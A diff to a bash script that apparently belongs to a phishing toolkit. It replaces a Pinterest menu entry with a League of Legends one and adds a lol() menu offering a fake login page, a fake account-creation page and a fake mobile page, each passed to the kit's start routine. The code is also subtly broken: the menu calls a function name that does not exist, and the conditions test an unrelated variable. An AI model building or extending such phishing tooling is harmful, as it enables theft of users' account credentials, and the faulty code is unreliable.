@@ -143,8 +143,7 @@ server="shopping"
 start
 
 elif [[ $menu_option == 19 ]]; then
-server="pinterest"
-start
+leageoflegends
 
 elif [[ $menu_option == 20 ]]; then
 server="cryptocurrency"
@@ -362,6 +361,36 @@ fi
 
 }
 
+lol(){
+clear
+banner
+printf " \n"
+printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Create account\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Fake mobile Page\e[0m\n"
+printf "\e[0m\n"
+read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' lol_option
+
+if [[ $fb_option == 1 || $lol_option == 01 ]]; then
+website="lol"
+start
+
+elif [[ $fb_option == 2 || $lol_option == 02 ]]; then
+website="createLOL"
+start
+
+elif [[ $fb_option == 3 || $lol_option == 03 ]]; then
+website="lol"
+start
+
+else
+printf "\n\n  \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
+sleep 1
+clear
+menu
+fi
+
+}
 
 Google() {
     clear
